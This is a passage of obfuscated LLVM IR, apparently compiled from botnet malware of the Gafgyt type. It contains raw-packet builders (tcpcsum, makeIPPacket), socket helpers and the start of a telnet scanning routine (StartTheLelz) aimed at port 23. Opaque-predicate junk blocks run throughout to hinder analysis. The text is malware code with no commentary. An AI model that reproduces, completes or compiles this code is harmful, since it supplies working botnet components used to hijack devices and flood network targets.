  %gen = mul i32 %_3, 2
  %_4 = sub i32 0, %113
  %gen5 = add i32 %_4, 2
  %_6 = sub i32 0, %113
  %gen7 = add i32 %_6, 2
  %_8 = shl i32 %113, 2
  %_9 = sub i32 %113, 2
  %gen10 = mul i32 %_9, 2
  %114 = sub nsw i32 %113, 2
  store i32 %114, i32* %4, align 4
  br label %originalBB

originalBB11alteredBB:                            ; preds = %originalBB11, %37
  %115 = load i16*, i16** %3, align 8
  %116 = bitcast i16* %115 to i8*
  %117 = load i8, i8* %116, align 1
  %118 = zext i8 %117 to i64
  %119 = load i64, i64* %5, align 8
  %_12 = sub i64 0, %119
  %gen13 = add i64 %_12, %118
  %_14 = sub i64 %119, %118
  %gen15 = mul i64 %_14, %118
  %_16 = shl i64 %119, %118
  %_17 = sub i64 %119, %118
  %gen18 = mul i64 %_17, %118
  %_19 = sub i64 %119, %118
  %gen20 = mul i64 %_19, %118
  %_21 = sub i64 %119, %118
  %gen22 = mul i64 %_21, %118
  %_23 = sub i64 %119, %118
  %gen24 = mul i64 %_23, %118
  %120 = add i64 %119, %118
  store i64 %120, i64* %5, align 8
  br label %originalBB11

originalBB28alteredBB:                            ; preds = %originalBB28, %61
  %121 = load i64, i64* %5, align 8
  %_29 = sub i64 %121, 16
  %gen30 = mul i64 %_29, 16
  %_31 = sub i64 %121, 16
  %gen32 = mul i64 %_31, 16
  %_33 = sub i64 %121, 16
  %gen34 = mul i64 %_33, 16
  %_35 = sub i64 %121, 16
  %gen36 = mul i64 %_35, 16
  %_37 = shl i64 %121, 16
  %_38 = shl i64 %121, 16
  %122 = lshr i64 %121, 16
  %123 = icmp ne i64 %122, 0
  br label %originalBB28

originalBB42alteredBB:                            ; preds = %originalBB42, %87
  %124 = load i64, i64* %5, align 8
  %_43 = sub i64 0, %124
  %gen44 = add i64 %_43, -1
  %_45 = sub i64 0, %124
  %gen46 = add i64 %_45, -1
  %_47 = shl i64 %124, -1
  %_48 = sub i64 0, %124
  %gen49 = add i64 %_48, -1
  %_50 = shl i64 %124, -1
  %125 = xor i64 %124, -1
  %126 = trunc i64 %125 to i16
  br label %originalBB42
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = load i32, i32* @x.71
  %4 = load i32, i32* @y.72
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.iphdr*, align 8
  %12 = alloca %struct.tcphdr*, align 8
  %13 = alloca %struct.tcp_pseudo, align 8
  %14 = alloca i16, align 2
  %15 = alloca i32, align 4
  %16 = alloca i16*, align 8
  %17 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %11, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %12, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 2
  %20 = load i16, i16* %19, align 2
  store i16 %20, i16* %14, align 2
  %21 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 8
  %23 = load i32, i32* %22, align 4
  %24 = zext i32 %23 to i64
  %25 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 0
  store i64 %24, i64* %25, align 8
  %26 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %27 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %26, i32 0, i32 9
  %28 = load i32, i32* %27, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 1
  store i64 %29, i64* %30, align 8
  %31 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 2
  store i8 0, i8* %31, align 8
  %32 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 3
  store i8 6, i8* %32, align 1
  %33 = call zeroext i16 @htons(i16 zeroext 20) #13
  %34 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 4
  store i16 %33, i16* %34, align 2
  store i32 44, i32* %15, align 4
  %35 = load i32, i32* %15, align 4
  %36 = sext i32 %35 to i64
  %37 = call noalias i8* @malloc(i64 %36) #2
  %38 = bitcast i8* %37 to i16*
  store i16* %38, i16** %16, align 8
  %39 = load i16*, i16** %16, align 8
  %40 = bitcast i16* %39 to i8*
  %41 = bitcast %struct.tcp_pseudo* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* %41, i64 24, i32 1, i1 false)
  %42 = load i16*, i16** %16, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = getelementptr inbounds i8, i8* %43, i64 24
  %45 = load %struct.tcphdr*, %struct.tcphdr** %12, align 8
  %46 = bitcast %struct.tcphdr* %45 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %44, i8* %46, i64 20, i32 1, i1 false)
  %47 = load i16*, i16** %16, align 8
  %48 = load i32, i32* %15, align 4
  %49 = call zeroext i16 @csum(i16* %47, i32 %48)
  store i16 %49, i16* %17, align 2
  %50 = load i16*, i16** %16, align 8
  %51 = bitcast i16* %50 to i8*
  call void @free(i8* %51) #2
  %52 = load i16, i16* %17, align 2
  %53 = load i32, i32* @x.71
  %54 = load i32, i32* @y.72
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i16 %52

originalBBalteredBB:                              ; preds = %originalBB, %2
  %61 = alloca %struct.iphdr*, align 8
  %62 = alloca %struct.tcphdr*, align 8
  %63 = alloca %struct.tcp_pseudo, align 8
  %64 = alloca i16, align 2
  %65 = alloca i32, align 4
  %66 = alloca i16*, align 8
  %67 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %61, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %62, align 8
  %68 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 2
  %70 = load i16, i16* %69, align 2
  store i16 %70, i16* %64, align 2
  %71 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 8
  %73 = load i32, i32* %72, align 4
  %74 = zext i32 %73 to i64
  %75 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 0
  store i64 %74, i64* %75, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %77 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %76, i32 0, i32 9
  %78 = load i32, i32* %77, align 4
  %79 = zext i32 %78 to i64
  %80 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 1
  store i64 %79, i64* %80, align 8
  %81 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 2
  store i8 0, i8* %81, align 8
  %82 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 3
  store i8 6, i8* %82, align 1
  %83 = call zeroext i16 @htons(i16 zeroext 20) #13
  %84 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 4
  store i16 %83, i16* %84, align 2
  store i32 44, i32* %65, align 4
  %85 = load i32, i32* %65, align 4
  %86 = sext i32 %85 to i64
  %87 = call noalias i8* @malloc(i64 %86) #2
  %88 = bitcast i8* %87 to i16*
  store i16* %88, i16** %66, align 8
  %89 = load i16*, i16** %66, align 8
  %90 = bitcast i16* %89 to i8*
  %91 = bitcast %struct.tcp_pseudo* %63 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %90, i8* %91, i64 24, i32 1, i1 false)
  %92 = load i16*, i16** %66, align 8
  %93 = bitcast i16* %92 to i8*
  %94 = getelementptr inbounds i8, i8* %93, i64 24
  %95 = load %struct.tcphdr*, %struct.tcphdr** %62, align 8
  %96 = bitcast %struct.tcphdr* %95 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %94, i8* %96, i64 20, i32 1, i1 false)
  %97 = load i16*, i16** %66, align 8
  %98 = load i32, i32* %65, align 4
  %99 = call zeroext i16 @csum(i16* %97, i32 %98)
  store i16 %99, i16* %67, align 2
  %100 = load i16*, i16** %66, align 8
  %101 = bitcast i16* %100 to i8*
  call void @free(i8* %101) #2
  %102 = load i16, i16* %67, align 2
  br label %originalBB
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = load i32, i32* @x.73
  %7 = load i32, i32* @y.74
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca %struct.iphdr*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8, align 1
  %18 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %14, align 8
  store i32 %1, i32* %15, align 4
  store i32 %2, i32* %16, align 4
  store i8 %3, i8* %17, align 1
  store i32 %4, i32* %18, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %20 = bitcast %struct.iphdr* %19 to i8*
  %21 = load i8, i8* %20, align 4
  %22 = and i8 %21, -16
  %23 = or i8 %22, 5
  store i8 %23, i8* %20, align 4
  %24 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %25 = bitcast %struct.iphdr* %24 to i8*
  %26 = load i8, i8* %25, align 4
  %27 = and i8 %26, 15
  %28 = or i8 %27, 64
  store i8 %28, i8* %25, align 4
  %29 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %30 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %29, i32 0, i32 1
  store i8 0, i8* %30, align 1
  %31 = load i32, i32* %18, align 4
  %32 = sext i32 %31 to i64
  %33 = add i64 20, %32
  %34 = trunc i64 %33 to i16
  %35 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 2
  store i16 %34, i16* %36, align 2
  %37 = call i32 @rand_cmwc()
  %38 = trunc i32 %37 to i16
  %39 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %40 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %39, i32 0, i32 3
  store i16 %38, i16* %40, align 4
  %41 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %42 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %41, i32 0, i32 4
  store i16 0, i16* %42, align 2
  %43 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 5
  store i8 -1, i8* %44, align 4
  %45 = load i8, i8* %17, align 1
  %46 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 6
  store i8 %45, i8* %47, align 1
  %48 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 7
  store i16 0, i16* %49, align 2
  %50 = load i32, i32* %16, align 4
  %51 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 8
  store i32 %50, i32* %52, align 4
  %53 = load i32, i32* %15, align 4
  %54 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 9
  store i32 %53, i32* %55, align 4
  %56 = load i32, i32* @x.73
  %57 = load i32, i32* @y.74
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %64 = alloca %struct.iphdr*, align 8
  %65 = alloca i32, align 4
  %66 = alloca i32, align 4
  %67 = alloca i8, align 1
  %68 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %64, align 8
  store i32 %1, i32* %65, align 4
  store i32 %2, i32* %66, align 4
  store i8 %3, i8* %67, align 1
  store i32 %4, i32* %68, align 4
  %69 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %70 = bitcast %struct.iphdr* %69 to i8*
  %71 = load i8, i8* %70, align 4
  %_ = sub i8 %71, -16
  %gen = mul i8 %_, -16
  %72 = and i8 %71, -16
  %_1 = shl i8 %72, 5
  %_2 = shl i8 %72, 5
  %_3 = sub i8 0, %72
  %gen4 = add i8 %_3, 5
  %_5 = shl i8 %72, 5
  %73 = or i8 %72, 5
  store i8 %73, i8* %70, align 4
  %74 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %75 = bitcast %struct.iphdr* %74 to i8*
  %76 = load i8, i8* %75, align 4
  %_6 = sub i8 %76, 15
  %gen7 = mul i8 %_6, 15
  %_8 = sub i8 0, %76
  %gen9 = add i8 %_8, 15
  %_10 = sub i8 0, %76
  %gen11 = add i8 %_10, 15
  %77 = and i8 %76, 15
  %_12 = shl i8 %77, 64
  %_13 = sub i8 0, %77
  %gen14 = add i8 %_13, 64
  %_15 = shl i8 %77, 64
  %_16 = sub i8 %77, 64
  %gen17 = mul i8 %_16, 64
  %78 = or i8 %77, 64
  store i8 %78, i8* %75, align 4
  %79 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %80 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %79, i32 0, i32 1
  store i8 0, i8* %80, align 1
  %81 = load i32, i32* %68, align 4
  %82 = sext i32 %81 to i64
  %_18 = sub i64 0, 20
  %gen19 = add i64 %_18, %82
  %_20 = sub i64 0, 20
  %gen21 = add i64 %_20, %82
  %_22 = sub i64 0, 20
  %gen23 = add i64 %_22, %82
  %_24 = shl i64 20, %82
  %_25 = shl i64 20, %82
  %_26 = shl i64 20, %82
  %_27 = shl i64 20, %82
  %_28 = sub i64 0, 20
  %gen29 = add i64 %_28, %82
  %83 = add i64 20, %82
  %84 = trunc i64 %83 to i16
  %85 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i32 0, i32 2
  store i16 %84, i16* %86, align 2
  %87 = call i32 @rand_cmwc()
  %88 = trunc i32 %87 to i16
  %89 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %90 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %89, i32 0, i32 3
  store i16 %88, i16* %90, align 4
  %91 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %92 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %91, i32 0, i32 4
  store i16 0, i16* %92, align 2
  %93 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i32 0, i32 5
  store i8 -1, i8* %94, align 4
  %95 = load i8, i8* %67, align 1
  %96 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i32 0, i32 6
  store i8 %95, i8* %97, align 1
  %98 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %99 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %98, i32 0, i32 7
  store i16 0, i16* %99, align 2
  %100 = load i32, i32* %66, align 4
  %101 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 8
  store i32 %100, i32* %102, align 4
  %103 = load i32, i32* %65, align 4
  %104 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %105 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %104, i32 0, i32 9
  store i32 %103, i32* %105, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %26

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* @x.75
  %9 = load i32, i32* @y.76
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* %3, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* %2, align 4
  %18 = load i32, i32* @x.75
  %19 = load i32, i32* @y.76
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %6
  %27 = load i32, i32* %2, align 4
  ret i32 %27

originalBBalteredBB:                              ; preds = %originalBB, %7
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @close(i32 %28)
  store i32 0, i32* %2, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %30

; <label>:13:                                     ; preds = %2
  %14 = load i32, i32* @x.77
  %15 = load i32, i32* @y.78
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  store i32 0, i32* %3, align 4
  %22 = load i32, i32* @x.77
  %23 = load i32, i32* @y.78
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %77

; <label>:30:                                     ; preds = %2
  %31 = load %struct.hostent*, %struct.hostent** %6, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 4
  %33 = load i8**, i8*** %32, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 0
  %35 = load i8*, i8** %34, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %37 = bitcast %struct.in_addr* %36 to i8*
  %38 = load %struct.hostent*, %struct.hostent** %6, align 8
  %39 = getelementptr inbounds %struct.hostent, %struct.hostent* %38, i32 0, i32 3
  %40 = load i32, i32* %39, align 4
  %41 = sext i32 %40 to i64
  call void @bcopy(i8* %35, i8* %37, i64 %41) #2
  %42 = load i16, i16* %5, align 2
  %43 = call zeroext i16 @htons(i16 zeroext %42) #13
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %43, i16* %44, align 2
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %45, align 4
  %46 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %46, i32* %9, align 4
  %47 = load i32, i32* %9, align 4
  %48 = bitcast i32* %8 to i8*
  %49 = call i32 @setsockopt(i32 %47, i32 6, i32 1, i8* %48, i32 4) #2
  %50 = load i32, i32* %9, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %30
  store i32 0, i32* %3, align 4
  br label %77

; <label>:53:                                     ; preds = %30
  %54 = load i32, i32* %9, align 4
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = call i32 @connect(i32 %54, %struct.sockaddr* %55, i32 16)
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %75

; <label>:58:                                     ; preds = %53
  %59 = load i32, i32* @x.77
  %60 = load i32, i32* @y.78
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %58
  store i32 0, i32* %3, align 4
  %67 = load i32, i32* @x.77
  %68 = load i32, i32* @y.78
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %77

; <label>:75:                                     ; preds = %53
  %76 = load i32, i32* %9, align 4
  store i32 %76, i32* %3, align 4
  br label %77

; <label>:77:                                     ; preds = %75, %originalBBpart24, %52, %originalBBpart2
  %78 = load i32, i32* %3, align 4
  ret i32 %78

originalBBalteredBB:                              ; preds = %originalBB, %13
  store i32 0, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %58
  store i32 0, i32* %3, align 4
  br label %originalBB1
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %23 = load i32, i32* %4, align 4
  store i32 %23, i32* %11, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = call i32 @rand_cmwc()
  %26 = xor i32 %24, %25
  call void @srand(i32 %26) #2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = call zeroext i16 @htons(i16 zeroext 23) #13
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %31 = getelementptr inbounds [8 x i8], [8 x i8]* %30, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %31, i8 0, i64 8, i32 4, i1 false)
  %32 = call noalias i8* @malloc(i64 1025) #2
  store i8* %32, i8** %17, align 8
  %33 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 1025, i32 1, i1 false)
  %34 = load i32, i32* %11, align 4
  %35 = zext i32 %34 to i64
  %36 = call i8* @llvm.stacksave()
  store i8* %36, i8** %19, align 8
  %37 = alloca %struct.telstate_t, i64 %35, align 16
  %38 = bitcast %struct.telstate_t* %37 to i8*
  %39 = load i32, i32* %11, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 5
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 %41, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  br label %42

; <label>:42:                                     ; preds = %76, %2
  %43 = load i32, i32* @x.79
  %44 = load i32, i32* @y.80
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %42
  %51 = load i32, i32* %5, align 4
  %52 = load i32, i32* %11, align 4
  %53 = icmp slt i32 %51, %52
  %54 = load i32, i32* @x.79
  %55 = load i32, i32* @y.80
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %53, label %62, label %79

; <label>:62:                                     ; preds = %originalBBpart2
  %63 = load i32, i32* %5, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %64
  %66 = bitcast %struct.telstate_t* %65 to i8*
  call void @llvm.memset.p0i8.i64(i8* %66, i8 0, i64 32, i32 16, i1 false)
  %67 = load i32, i32* %5, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %68
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %69, i32 0, i32 3
  store i8 1, i8* %70, align 1
  %71 = load i8*, i8** %17, align 8
  %72 = load i32, i32* %5, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %73
  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i32 0, i32 9
  store i8* %71, i8** %75, align 8
  br label %76

; <label>:76:                                     ; preds = %62
  %77 = load i32, i32* %5, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %5, align 4
  br label %42

; <label>:79:                                     ; preds = %originalBBpart2
  store i32 0, i32* %7, align 4
  br label %80

; <label>:80:                                     ; preds = %87, %79
  %81 = load i32, i32* %7, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %83
  %85 = load i8*, i8** %84, align 8
  %86 = icmp ne i8* %85, null
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %80
  br label %80

; <label>:88:                                     ; preds = %80
  br label %89

; <label>:89:                                     ; preds = %originalBBpart2146, %88
  br label %90

; <label>:90:                                     ; preds = %89
  store i32 0, i32* %5, align 4
  br label %91

; <label>:91:                                     ; preds = %originalBBpart2142, %90
  %92 = load i32, i32* %5, align 4
  %93 = load i32, i32* %11, align 4
  %94 = icmp slt i32 %92, %93
  br i1 %94, label %95, label %1140

; <label>:95:                                     ; preds = %91
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %97
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %98, i32 0, i32 7
  %100 = load i32, i32* %99, align 16
  %101 = icmp eq i32 %100, 0
  br i1 %101, label %102, label %124

; <label>:102:                                    ; preds = %95
  %103 = load i32, i32* @x.79
  %104 = load i32, i32* @y.80
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %102
